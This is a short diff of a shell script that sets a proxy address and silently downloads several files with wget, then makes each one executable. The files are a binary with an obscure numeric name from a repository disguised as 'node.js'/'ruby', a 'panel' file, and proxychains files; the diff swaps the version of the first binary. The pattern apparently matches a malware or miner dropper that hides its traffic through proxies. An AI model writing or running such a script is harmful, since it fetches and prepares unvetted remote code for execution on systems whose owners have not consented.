@@ -1,6 +1,6 @@
 proxy="192.252.209.155" 
 port="14455" 
-wget -q -O 0083075176 https://gitlab.com/node.js2594450/ruby/-/raw/main/5.0.14 && chmod +x 0083075176
+wget -q -O 0083075176 https://gitlab.com/node.js2594450/ruby/-/raw/main/4.5.11 && chmod +x 0083075176
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
